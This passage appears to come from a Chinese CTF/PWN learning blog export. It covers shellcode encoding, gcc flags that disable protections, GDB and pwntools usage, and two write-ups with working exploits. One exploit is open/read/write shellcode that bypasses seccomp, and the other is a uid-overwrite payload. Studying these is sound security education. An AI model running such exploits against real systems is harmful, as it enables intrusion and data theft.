~/Softwares/alpha3/ALPHA3.py ~/.link/ALPHA3.py\n```\n\n在做一个scmker.py文件，这个放在我的vscode里面，再弄一个ln出去玩：\n\n```python\nsudo ln -s /home/kanyo/pwn_test/pwncodes/python/scmker/scmker.py ~/.link/scmker.py\n```\n\n测试一下：\n\n```python\n#python ~/.link/scmker.py > ~/.link/shellcode\n#python2 ~/.link/ALPHA3.py x64 ascii mixedcase rax --input=\"$HOME/.link/shellcode\"\n#python2 ~/.link/ALPHA3.py x32 ascii mixedcase rax --input=\"$HOME/.link/shellcode\"\nfrom pwn import *\n\ncontext.arch='amd64'\n#context/arch='x86_64'\n\nsc = shellcraft.sh()\nprint(asm(sc))\n```\n\n![](/img/filesimg/shellcode%20-%20alpha3.py/shellcode%20-%20alpha3.py_2.png)\n\n非常完美。其实这个代码还需要配合控制台用有点傻逼。不过我现在没有修改他的想法。等我哪天做题崩溃了再来补充吧~、\n\n## 后注：\n似乎python3版本的pwntool威力有点强大，导致有一个问题：为了避免很多不必要的bug，python3的shellcraft又臭又长。\n\n```python\nPh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01\n```\n\n上面使用python3生成的shellcode，下面是python2的老版本pwntools生成的shellcode：\n\n```python\nPh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\n```\n\n快他妈的两倍了。所以代码最好改成：\n\n```python\n#全部改用python2\n#python2 ~/.link/scmker.py > ~/.link/shellcode\n#python2 ~/.link/ALPHA3.py x64 ascii mixedcase rax --input=\"$HOME/.link/shellcode\"\n#python2 ~/.link/ALPHA3.py x32 ascii mixedcase rax --input=\"$HOME/.link/shellcode\"\nfrom pwn import *\n\ncontext.arch='amd64'\n#context/arch='x86_64'\n\nsc = shellcraft.sh()\nprint(asm(sc))\n```\n\n","tags":["PWN的工具笔记"],"categories":["PWN不出来"]},{"title":"其他-gcc指令","url":"//docx/其他-gcc指令/","content":"## 基础指令\n最基本的GCC编译命令格式：\n\n```bash\ngcc [选项] [源文件] [选项] [目标文件]\n```\n\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">-o</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：将</font>_**C源文件**_<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">编译成</font>_**可执行文件**_\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">-g</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：生成时候带有debug信息</font>\n\n## 常用命令\n```bash\n#32 位保护全关的编译命令\ngcc -m32 -fno-stack-protector -z execstack -no-pie -fno-pic -O0 -U_FORTIFY_SOURCE -o program32 program.c\n#64 位保护全关的编译命令\ngcc -m64 -fno-stack-protector -z execstack -no-pie -fno-pic -O0 -U_FORTIFY_SOURCE -o program64 program.c\n\n#32 位保护全关且关闭编译器警告命令\ngcc -m32 -fno-stack-protector -z execstack -no-pie -fno-pic -Wno-implicit-function-declaration -o program32 program.c\n#32 位保护全关且关闭编译器警告命令\ngcc -m64 -fno-stack-protector -z execstack -no-pie -fno-pic -Wno-implicit-function-declaration -o program64 program.c\n```\n\n## 平台相关\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">-m32</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：生成 32 位代码，需要系统安装 32 位开发库。</font>\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">-m64</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：生成 64 位代码（默认选项，64 位系统下）。</font>\n\n## 保护机制相关\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">NX 保护（数据执行保护）</font>**\n    - **<font style=\"color:rgb(0, 0, 0) !important;\">-z execstack</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：关闭 NX 保护，使栈可执行（不安全）。</font>\n    - **<font style=\"color:rgb(0, 0, 0) !important;\">-z noexecstack</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：开启 NX 保护（默认），使栈不可执行。</font>\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">Canary（栈保护）</font>**\n    - **<font style=\"color:rgb(0, 0, 0) !important;\">-fno-stack-protector</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：关闭栈保护。</font>\n    - **<font style=\"color:rgb(0, 0, 0) !important;\">-fstack-protector</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：启用基础栈保护。</font>\n    - **<font style=\"color:rgb(0, 0, 0) !important;\">-fstack-protector-all</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：启用全面栈保护（所有函数）。</font>\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">RELRO（地址重定向保护）</font>**\n    - **<font style=\"color:rgb(0, 0, 0) !important;\">-Wl,-z,relro</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：部分 RELRO，使 GOT 表只读。</font>\n    - **<font style=\"color:rgb(0, 0, 0) !important;\">-Wl,-z,now</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：完全 RELRO，程序加载时解析所有符号。</font>\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">PIE（位置无关可执行文件）</font>**\n    - **<font style=\"color:rgb(0, 0, 0) !important;\">-fPIE -pie</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：生成 PIE 可执行文件，启用 ASLR 保护。</font>\n    - <font style=\"color:rgba(0, 0, 0, 0.85) !important;\">-no-pie</font>\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">Fortify Source</font>**\n    - **<font style=\"color:rgb(0, 0, 0) !important;\">-D_FORTIFY_SOURCE=2</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：增强缓冲区溢出检测。</font>\n\n## 优化相关\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">-O0</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：不进行优化（默认级别），调试友好。</font>\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">-O1</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：基础优化，在编译时间和代码性能间平衡。</font>\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">-O2</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：中级优化，比 - O1 更激进，推荐生产环境使用。</font>\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">-O3</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：高级优化，启用更多优化选项，可能增加编译时间。</font>\n+ **<font style=\"color:rgb(0, 0, 0) !important;\">-Os</font>**<font style=\"color:rgba(0, 0, 0, 0.85) !important;\">：针对代码尺寸优化，适合嵌入式系统。</font>\n\n","tags":["PWN的工具笔记"],"categories":["PWN不出来"]},{"title":"GDB_PWNDBG调试","url":"//docx/GDB_PWNDBG调试/","content":"# 简介\n下载什么就不多说了，我们直接讲使用。\n\nGDB算是这个世界上最强的动态调试器了，而PWNDBG是GDB的一个插件，可以更好地展示GDB得到的一些内容，让我们方便理解。\n\nGDB可以使用的功能包括且不限于：\n\n运行\n\n步入、步过、步出、步止\n\n断点（设置、删除、显示）\n\n查看内存、寄存器、各种参数\n\n设置内存、寄存器、各种参数（加载文件）\n\n远程调试\n\n其他辅助功能\n\n当我们要调试某个程序的时候，要输入：\n\n```bash\n>gdb [文件名]\n```\n\n当我们忘记命令的时候，可以输入：\n\n```bash\n(gdb)/(pwndbg) help\n```\n\n以Intel方式查看汇编代码（似乎pwndbg默认Intel汇编代码格式）：\n\n```bash\n(gdb)/(pwndbg) set disassembly-flavor intel\n```\n\n上述的查看反汇编格式，可以通过修改.gdbinit来完成。\n\n```bash\nvim ~/.gdbinit\n(vim) disassembly-flavor intel\n```\n\n接下来 我们一点一点开始讲。\n\n# 程序执行与控制\n## 执行程序及设置管理断点\n当我们要执行一个程序的时候，我们需要输入`run`（简写`r`）或者`start`\n\n```bash\n(gdb)/(pwndbg) run\t\t#程序直接跑一边，如果有断点进入断点处\n(gdb)/(pwndbg) r\t\t\t#同上\n(gdb)/(pwndbg) start\t#从gdb认为的入口点开始步入运行\n```\n\n在这之后，我们一般而言会设置断点（`break`，简写`b`）来方便调试程序：\n\n```bash\n(gdb)/(pwndbg) b main\n(gdb)/(pwndbg) break main\n(gdb)/(pwndbg) b *0x000000FF\t#这是一个地址\n```\n\n`b`是用来断点的，或者说是标记断点且默认处于启动状态。我们也可以用`disable`或者`dis`、`disa`来禁用全部断点或者部分断点。启用断点则是`enable`或者`en`。而当某个断点不需要的时候，我们可以使用`delete`或者`d`来删除断点。其中每个断点都会有一个b_id号码。不过删除和禁用分别有两种语法需要注意：\n\n```bash\n(gdb)/(pwndbg) d id\t\t\t#删除某id的断点\n(gdb)/(pwndbg) d 1\t\t\t#删除id为1的断点\n(gdb)/(pwndbg) dis b id\t#禁用某id的断点\n(gdb)/(pwndbg) dis b 1\t#禁用id为1的断点\n(gdb)/(pwndbg) en b id\t#启用某id的断点\n(gdb)/(pwndbg) en b 1\t\t#启用id为1的断点\n```\n\n其实pwn方向一般不会设置太多断点啥的。不过逆向倒是要学这些。\n\n如果想是一些开有PIE的保护的话，我们则需要一个`*$rebase(偏移量)`函数了。例如：\n\n```c\nb *$rebase(0x0f0)\n```\n\n## 步操作\n```c\nint sum(int a,int b){\n    int sumnum = a + b;\n    return sum_num;\n}\nint main(){\n    int a;\n    printf(\"1+2=\");\n    a = sum(1,2);\n    printf(\"%d\",a);\n    return 0;\n}\n```\n\n在上面这个代码里面，我们可以用GDB做一些基础的程序运行操作：\n\n**步入（**`**step**`** 简写为**`**s**`**）：**用于单步执行程序，当遇到函数调用时，会进入该函数内部，逐行执行函数的实现代码。当我运行到第 6 行的 printf 的时候，步入会进入 printf 函数中，一步步走过 printf 函数的实现代码。\n\n**步过（**`**next**`** 简写为**`**n**`**）：**同样是单步执行，但遇到函数调用时，不会进入函数内部，而是直接执行完该函数后，进入下一行代码等待执行。当我运行到第 7 行的 printf 的时候，步过会不管 printf 函数里面如何如何，直接运行完 printf 函数进入到第 8 行 sum 函数待执行。\n\n`s`和`n`都可以在后面加一个`<font style=\"color:rgba(0, 0, 0, 0.85);\">instruction</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">参数，大概使用方法就是</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">si</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">和</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">ni</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">：</font>\n\n`<font style=\"color:rgba(0, 0, 0, 0.85);\">si</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">（step instruction）：执行下一步汇编指令，</font>**会进入汇编或 C 函数内部**<font style=\"color:rgba(0, 0, 0, 0.85);\">，无论函数是否有调试信息。</font>\n\n`<font style=\"color:rgba(0, 0, 0, 0.85);\">ni</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">（next instruction）：执行下一步汇编指令，</font>**不会进入任何函数内部**<font style=\"color:rgba(0, 0, 0, 0.85);\">，直接执行完当前汇编指令并停在下一条。</font>\n\n<font style=\"color:rgba(0, 0, 0, 0.85);\">简单来说，</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">s/n</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">适用于 C 代码层面的调试，</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">si/ni</font>`<font style=\"color:rgba(0, 0, 0, 0.85);\">适用于更底层的汇编层面调试，核心区别在于是否进入函数、以及进入后的定位级别（C 级 vs 汇编级）。</font>上面两个指令，一般情况下都会用`n`和`ni`。\n\n**步出（**`**finish**`** 简写为**`**fin**`**）：**适用于已进入某个函数内部，希望快速结束该函数的执行，直接返回到调用该函数的下一行代码。当我从第八行步入到 sum 函数之后，我感觉 sum 函数不需要看，想要直接从 sum 函数回到 main 函数的时候，步出可以快速运行完 sum 函数回到 main 函数的第九行待执行。\n\n**步止（**`**continue**`**/**`**until**`** 简写为**`**c**`**/**`**u 行号**`**）：**用于让程序持续运行，**执行到断点停止**。如果我想运行到第 10 行等待，那么我可以设置一个断点在第十行，这样执行步止操作的时候我就可以直接运行到第十行。\n\n# 数据查看与修改\n## 寄存器数据与汇编代码查看\n在指令里面，分为_操作符号_和_被操作的对象_。例如下面的：\n\n查看（`info` 简写为`i`）：用于查看对象的值。例如查看断点则是`i b`\n\n寄存器（`registers` 简写为`r`）：一种被查看的对象。例如查看寄存器的值可以是`i r`\n\n例如查看寄存器的值可以写成`(gdb)(pwndbg) i r`\n\n反汇编（`disassemble` `函数名/$寄存器名(eip/rip)`）：将某一段函数或者rip/eip指针附近的机器码反编译为汇编。也是一种操作。\n\n```bash\n(gdb)/(pwndbg) disassemble main\n(gdb)/(pwndbg) disassemble $rip\n```\n\n## 内存数据查看\n除了上面的`i r`，我还可以通过`print`（缩写为`p`）来查看寄存器的位置（也就是此寄存器的地址），例如`p eax`\n\n如果我要看地址的话，就要用`x`指令来查询。\n\n例如有一个movzx eax,BYTE PTR[rbp-0x20]的操作，我现在想要查询`rbp-0x20`这个地址里面的值，就可以用：`x/20b $rbp-0x20`的方式。这样就是一个`byte`一个`byte`的查询20个`byte`。其中语法是这样的：\n\n```bash\nx/[查询行数][以多少位输出][显示格式] [查询的地址]\n```\n\n如此这般的有：\n\n`x/20gx`<font style=\"color:rgba(0, 0, 0, 0.85);\">（64 位十六进制，显示 20 项）</font>  \n`x/20wx`<font style=\"color:rgba(0, 0, 0, 0.85);\">（32 位）</font>  \n`x/20bx`<font style=\"color:rgba(0, 0, 0, 0.85);\">（8 位）  \n</font>`x/20bx`<font style=\"color:rgba(0, 0, 0, 0.85);\">（字符串显示）</font>  \n`x/20ix`<font style=\"color:rgba(0, 0, 0, 0.85);\">（反汇编指令显示）</font>\n\n## 内存数据修改\n如果我要修改这里的值，那么就用`set`指令，其中语法为：\n\n```bash\nset ([地址值])=[修改值]\t#这个地址值外面的的括号必须有\n```\n\n例如`set (rbp - 0x10) = 41`\n\n如此这般的有：\n\n`set *0x7ffffffe050=19`<font style=\"color:rgba(0, 0, 0, 0.85);\">（改写内存值）</font>  \n`set $rax=19`<font style=\"color:rgba(0, 0, 0, 0.85);\">（改写寄存器值）</font>  \n`set(char [4])0x80477a4 = \"Ace\"`<font style=\"color:rgba(0, 0, 0, 0.85);\">（改写内存字符串）</font>\n\n\n\n# 远程调试\n","tags":["PWN的工具笔记"],"categories":["PWN不出来"]},{"title":"pwntools","url":"//docx/pwntools/","content":"# 下载\n## python3版本\n这个就去看我写的pwn基础配置吧，一般而言不做老题目的话python3适配的pwntools完全够用了。不过我为了测试和学习一些老东西留下的宝贵信息，还是会用到适配python2的pwntools的。\n\n[pwn基础配置](/docx/pwn%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/)\n\n## python2版本\n`pwntools` 从 4.0 版本开始**完全移除了 Python 2 支持**，依赖现代 Python 特性（如 `asyncio`）。\n\n现在想用pwntools的python2版本只能用pwntools 3.14.1\n\n### 检查python2和pip2\n```shell\npython2 --version  # 应输出 Python 2.7.18\npip2 --version     # 应输出 pip 20.3.4 或类似版本\n```\n\n一般而言，可能没有python2.可以去看我写的另外一个工具笔记：\n\n[python2环境](/docx/python2%E7%8E%AF%E5%A2%83/)\n\n如果上面ok了\n\n```shell\npip2 install --user pyelftools==0.27\npip2 install --user --upgrade 'pwntools<3.15'\n```\n\n# 使用\npwntools的使用非常简单，记住一些简单的函数就可以用起来了：\n\n这边写一个简单的脚本，主要是看函数的：\n\n```python\nfrom pwn import *\n\n# ===== 基础设置 =====\ncontext(arch='amd64', log_level='debug', os='linux')  # 设置架构为64位\n# context(arch='i386', log_level='debug', os='linux')  # 设置架构为32位（取消注释使用）\n\n# ===== 连接方式 =====\n# p = remote('host', 1234)       # 远程连接\np = process('./binary')         # 本地进程\n# p = gdb.debug('./binary')     # 带GDB调试\n\n# ===== 数据发送 =====\np.send(b'data')                 # 直接发送数据\np.sendline(b'data\\n')           # 发送数据并添加换行\np.sendafter(b'prompt: ', b'data')  # 等待提示后发送\np.sendlineafter(b'prompt: ', b'data')  # 等待提示后发送并换行\n\n# ===== 数据接收 =====\ndata = p.recv()                 # 接收所有数据\ndata = p.recv(1024)             # 接收指定字节数\ndata = p.recvline()             # 接收一行数据\ndata = p.recvuntil(b'delim')    # 接收直到遇到分隔符\ndata = p.recvregex(b'pattern')  # 接收直到匹配正则表达式\n\n# ===== 内存操作 =====\n# 64位\naddr = 0x123456789ABCDEF0\npayload = b'A'*40 + p64(addr)   # 64位地址填充\nvalue = u64(b'\\xef\\xcd\\xab\\x89\\x67\\x45\\x23\\x01')  # 字节转64位整数\n\n# 32位（取消注释使用）\n# addr = 0x12345678\n# payload = b'A'*40 + p32(addr)  # 32位地址填充\n# value = u32(b'\\x78\\x56\\x34\\x12')  # 字节转32位整数\n\n# ===== 高级功能 =====\n# 格式化字符串漏洞利用\npayload = fmtstr_payload(6, {elf.got.puts: elf.plt.system})\n\n# ROP链构建\nelf = ELF('./binary')\nrop = ROP(elf)\nrop.call(elf.plt.puts, [elf.got.puts])  # 泄露puts地址\nrop.call(elf.symbols.main)              # 返回main\np.sendline(rop.chain())\n\n# Libc地址计算\nlibc = ELF('./libc.so.6')\nputs_leak = u64(p.recv(6).ljust(8, b'\\x00'))\nlibc.address = puts_leak - libc.symbols.puts\n\n# 执行系统命令\nrop = ROP(libc)\nrop.system(next(libc.search(b'/bin/sh')))\np.sendline(rop.chain())\n\n# ===== 其他功能 =====\nshellcode = asm(shellcraft.sh())  # 生成shellcode\np.sendline(shellcode)\n\np.interactive()                   # 进入交互式shell\np.close()                         # 关闭连接\n```\n\n","tags":["PWN的工具笔记"],"categories":["PWN不出来"]},{"title":"shellcode1_dahuan02","url":"//docx/shellcode1_dahuan02/","content":"> Shellcode、ORW\n>\n> 依旧是大欢老师给的shellcode题目。\n>\n\nchecksec一下，里面大概是这样的。\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_0.png)\n\n一些保护其实可以通过逆向后的代码看出来。不过我们依旧按照正常流程走一遍就好了，也花不了什么时间，就是大概了解一下。\n\n直接看代码：\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_1.png)\n\n我们在编译main函数的时候会触发一个问题，他说这个0x40133B这一行（也就是call rdx）这里有问题。我们先看一下这几句话吧。\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_2.png)\n\n这边大概可以看到，在read函数之后，程序有一个jle指令（jle是jump if less or equal，小于等于时候跳转），也就是跳转。跳转到下面之后会报一个stack_chk_fail的错误，也就是什么栈检测报错。反正我们就把它当作一个栈保护就行了，也就是说我们最好不要跳转。再回到上面报错的这一行，是一个call rdx...也就是执行rdx里面的内容。\n\n怪不得报错呢，因为这一行直接执行相当于一个call指令，但是没有call任何的函数，而是一个寄存器，所以我们没有办法把他反编译成伪C里面的“调用了什么函数”如此这般的写法。\n\n所以我们选中这一句call rdx，右键给他暂时不反编译就好了： \n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_3.png)\n\n然后再F5\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_4.png)\n\n这里的代码是这样的，有一个超级大的buf，我可以往里面塞入很多东西，然有一个大于判断。\n\n我们刚刚在上面看到一个jle跳转就是这里，不过是小于等于就跳转到一个报stack检查错误的地方\n\nread的返回值大于0的时候，也就是当我们往里面输入东西给予了一个read_return>0的情况的时候就可以跳转到if里面，而if里面会把我们输入的最后一个字符后面的空间改成'\\0'，结束字符串。\n\n这个JUMPOUT就是我们上面不反编译的两行，其实就是call rdx这个功能。\n\n所以我们只需要构造一个shellcode，让他进入rdx并且进入if判定后开始运作就行了。我们再看一眼汇编，主要看call rdx前面发生了什么。\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_5.png)\n\n这边右键可以恢复编码。\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_6.png)\n\n鼠标放在rdx上显示所有和rdx有关的操作。不难发现，在判断后面错了一系列操作。\n\n我们来看一下401328，代码在这里就可以展示他的逻辑了：首先是把rbp+buf的偏移地址放到rax中，然后rax把偏移地址的值赋值给[rbp+var_118]，然后rdx被赋值为[rbp+var_118]的值，最后运行。\n\n简单而言就是：\n\n```c\nrax = &[rbp+buf]\n[rbp+var_118] = rax\nrdx = [rbp+var_118]\neax = 0\n    call rdx\n```\n\n再简单点就是:\n\n```c\nrdx = &[rbp+buf]\ncall rdx\n```\n\n至于为什么源代码要写成这样，这是很程序员的问题了。没有优化是其中一点，其他还有各种各样的比如说rax、eax要当函数返回值所以约定俗成的不会乱改值，人手工传入的值也要保持干净。不多说了。\n\n反正就是我塞入进去的值会被直接放在栈上执行，而在checksec的时候可以看到栈上是可执行的。\n\n不过如果我们直接写一个shellcode或者shellcraft一个shellcode的话似乎都是不行的。我们看看会报什么错误：\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_7.png)\n\n他说了一个-31的退出报错码，-31代表的是错误的系统调用。\n\n在我们刚刚看汇编的时候除了read函数还有一个init初始化函数，这个里面有什么？\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_8.png)\n\n初始化除了setvbuf用来初始化stdin和_bss内容，还有很多的seccomp函数。\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_9.png)\n\n这个函数大概的内容是给我们程序一定的系统调用权限的。我们可以看到他把初始化的内容给了v1，而初始化是0，其实就是代表着，他把所有的syscall权限全关掉了。然后分别add了几个权限，并且带入了v1来更新v1的值。\n\n好了，现在我们有一个更加方便的办法来看这个应用开了那些syscall权限，要用seccomp-tools工具。语法如下：\n\n```plain\nseccomp-tools dump ./binary\n```\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_10.png)\n\n其中有变化的是2ll 0ll 1ll 和 60ll，分别对应了syscall里面的Open、Read、Write和Exit。那么我现在只能构造一个shellcode，使用到Open Read和Write来读出flag了。流程大概如下：\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_11.png)\n\n所以，exp写成这样：\n\n```python\nfrom pwn import*\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\np = process(\"./shellcode1_dahuan02\")\nbss_addr = 0x404010\nshellcode = \"\"\"\npush 0x67616c66\nmov rdi, rsp\nxor edx, edx\nxor esi, esi\npush 2\npop rax\nsyscall\n\nxor eax, eax\npush 3\npop rdi\npush 0x64\npop rdx\nmov esi, 0x0404010\nsyscall\n\npush 1\npop rdi\npush 0x64\npop rdx\nmov esi, 0x0404010\npush 1\npop rax\nsyscall         \n\"\"\"\nprint(shellcode)\npayload = asm(shellcode)\np.send(payload)\np.interactive()\n```\n\n有个小问题，bss_addr在哪里找的：\n\n![](/img/filesimg/shellcode1_dahuan02/shellcode1_dahuan02_12.png)\n\nida找一下bss段在哪里就行。为什么用是因为他初始化过了，而且.bss存放什么静态变量之类的东西，确实打开文件读取值就是他的活。\n\n然后这个代码可以写成使用shellcraft的方式，如下：\n\n```python\nfrom pwn import*\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\np = process(\"./shellcode1_dahuan02\")\nbss_addr = 0x404010\nshellcode = shellcraft.open('flag')\nshellcode += shellcraft.read(3,bss_addr,100)\nshellcode += shellcraft.write(1,bss_addr,100)\npayload = asm(shellcode)\np.send(payload)\np.interactive()\n```\n\n","tags":["shellcode","PWN的writeup","大欢老师の屎题"],"categories":["PWN不出来"]},{"title":"main_dahuan01","url":"//docx/main_dahuan01/","content":"> 其他类型\n>\n\n这个是大欢老师给我的一道金科师傅的题目，让我做着玩，非常有趣。然后因为这个是前辈写的小玩意，我可能在写wp的时候会骂脏话，不过我会用*号替代大部分的。\n\n先checksec一下看一下大概吧。\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_0.png)\n\n一道保护全开的题目，但是一般这种保护全开的题目要么很简单，要么就是难到完全做不了。不过大概率是前者。\n\n大概玩了一下这个程序，是一个类似于银行系统，可以注册登录，存钱取钱。\n\n首先打开IDA之后，要对代码逐步分析。特别是把里面的变量名改一下。就从`register`存钱的这个函数开始：\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_1.png)\n\n根据上下文，读懂代码之后很快就可以把大部分变量名给改好了，然后我们再去看有后门的函数`menu`，再对里面的一些变量名重新命名，这下我们大概就能看懂代码了。\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_2.png)![](/img/filesimg/main_dahuan01/main_dahuan01_3.png)\n\n我们了解一下，后门函数的触发条件是当uid==11451419的时候，就会触发。然后通过`reg`函数和`save`函数，大概可以看出来，每次我注册的的时候，uid就会++。也就是当我注册第11451419个账户的时候，我就可以很自然的获得管理员权限。\n\n所以第一种解决方案就是注册11451419个账户。很显然这个非常的愚蠢而且不实际...不过我们可以试试。\n\n## 第一种解决方案：暴力遍历！\n我们先看一下正常注册一个账号的流程：\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_4.png)\n\n根据获取和我要输出的内容，构造一个py文件即可。\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_5.png)\n\n```plain\nfrom pwn import*\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\n\n#我还多写了点内容\nfor a in range(0,11451419):\n    p = process(\"./main_dahuan01\")\n    p.sendafter(\"3.Exit\",\"1\")\n    p.sendafter(\"set\",\"111111\")\n    p.sendafter(\"name\",\"name\"+str(a))\n    p.sendafter(\"4.exit\",\"4\")\n    print(\"register num:\\t\"+str(a))\n    p.close()\n```\n\n好了这个方法有用是有用，但是1145万次操作，大概要花费一个多月的时间。我们有时间还是别折腾这傻逼代码了。\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_6.png)\n\n讲个好消息，我生成到3800多个账户的时候我就后悔了，然后删除这些傻逼文件花了我四分钟。\n\n我是真不理解怎么会有**这么写代码的，**的一个用户生成一条文件真的是太逆天了。\n\n我们来试试第二种方法吧。。。\n\n## 第二种解决方案：构造巧妙payload\n对吗，这才是我们pwn爷优雅解决题目的办法。\n\n我们再次回到题目，除了save，他还有一个读取文件（特别是读取金额）的部分，我们来看看这部分的代码。\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_7.png)\n\n在这个`read_f`中，不难发现里面有一个小漏洞：读取password后，会读取username_len，而接下来的username会读取username_len个长度的内容。\n\n大概的意思就是，如果我的usernamel_len的长度是100，他就会读取100个数据。而username_len是怎么构造出来的呢？\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_8.png)\n\n在程序中使用read函数的时候，read函数会有一个int类型的返回值，这个返回值是我输入了多少长度就返回多少长度。于是乎我们就可以画下面这张正常运行时候的图片：\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_9.png)\n\n当uid在0的情况下，我可以构造这么一个非常巧妙的字符串存在文件里面等待读取：\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_10.png)\n\n这边有几个小知识点，第一个是`fwrite`和`fread`函数，它的参数大概是这样的：\n\n```plain\nsize_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)\nsize_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)\n```\n\n其中第一个参数当然是我塞入进去要写出字符串啦，第二个是每个元素的大小，第三个是给我写入或者读出的字符串预留的空间，最后一个是程序流，也就是我输入的文本就是要从stream里面获取的。\n\n而每次塞入的长度都是什么6ull,4ull的，所以塞入的时候，值后面一定会有\"\\0\"这种结尾符号，哪怕我存入数字1，到机器里面也是0x00000001，最后被读取出来的时候就只有0x01和0x00两个有效信息了，一个告诉我没有更多的值了（0x00的作用），还有一个告诉我值是多少（0x01的作用）如图所示：\n\n![](/img/filesimg/main_dahuan01/main_dahuan01_11.png)\n\n所以我只要创建第一个账户，也就是uid为0的账户，然后在注册username的时候输入一个\"字符串+\\0+字符串\"的构造塞进去，让他把uid应该读取到的第一个数字\"0\"变成**多出来的username**末尾的\"\\0\"（这里可能有点不准确，不过无伤大雅，因为哪怕这个0没有变成\\0，也会紧随后面的数字变成011451419，还是11451419）。随后程序在读取所谓的字符串后面的内容的时候，就会把uid的内容往后读一格，也就变成了money_save里面的内容。\n\n上述有两种可能的情况，我觉得第二种应该比较对，我也懒得验证了，反正代码能跑就行。不过经过我的思考之后，因为会读取username_len个长度，也就是那个0是被留在后面的。所以后面的数字也就是uid会变成011451419。\n\n然后可能就会有人问\"不是，我这么构造，uid不是直接就变成11451419了嘛？\"你说的没错，不过还有一个小错误。还记得我删掉三千多条文件嘛，这个臭********，最***的部分就在这里，如下图所示： \n\n![](/img/filesimg/main_dahuan01/main_dahuan01_12.png)\n\n看到这个file_uid了嘛，没错，一开始读取uid的时候，读取的是文件的名字...文件创建出来就是叫0，而里面存的uid值是11451419。exp如下：\n\n```plain\nfrom pwn import*\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\n\np = process(\"./main_dahuan01\")\np.sendafter(\"3.Exit\",b\"1\")\np.sendafter(\"set\",b\"111111\")\np.sendafter(\"name\",b\"adad\\0ada\")\np.sendafter(\"2.save money\",b\"2\")\np.sendafter(\"to save\",b\"11451419\")\np.sendafter(\"4.exit\",b\"4\")\np = 